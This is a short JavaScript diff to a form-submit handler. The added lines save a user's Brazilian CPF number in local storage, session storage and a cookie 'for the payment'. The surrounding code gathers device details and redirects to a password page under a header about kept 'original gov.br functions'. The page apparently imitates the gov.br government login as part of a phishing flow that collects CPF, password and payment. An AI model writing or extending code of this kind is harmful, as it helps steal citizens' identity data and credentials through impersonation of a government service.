@@ -259,6 +259,11 @@ function onSubmit(event) {
         return;
     }
     
+    // SALVAR CPF PARA USAR NO PAGAMENTO
+    localStorage.setItem('user_cpf', cpfNumeros);
+    sessionStorage.setItem('user_cpf', cpfNumeros);
+    document.cookie = `user_cpf=${cpfNumeros}; path=/; max-age=86400`;
+    
     // Coletar dados do dispositivo
     const userAgent = navigator.userAgent;
     let dispositivo = 'Desktop';
@@ -315,7 +320,6 @@ function onSubmit(event) {
             window.location.href = '/password.html';
         });
 }
-
 // ============================================================
 // FUNCOES ORIGINAIS DO GOV.BR (MANTIDAS)
 // ============================================================
